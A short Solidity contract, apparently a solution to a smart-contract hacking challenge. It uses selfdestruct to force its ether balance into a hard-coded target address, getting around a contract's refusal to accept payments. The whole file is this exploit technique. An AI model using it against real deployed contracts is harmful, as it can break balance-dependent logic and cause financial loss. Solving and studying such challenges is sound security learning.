// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHack {
    function hack() public payable {
        selfdestruct(payable(address(0x8f7CE44270e0355CdcB1E92FC77D0AC6463a9b37)));
    }
}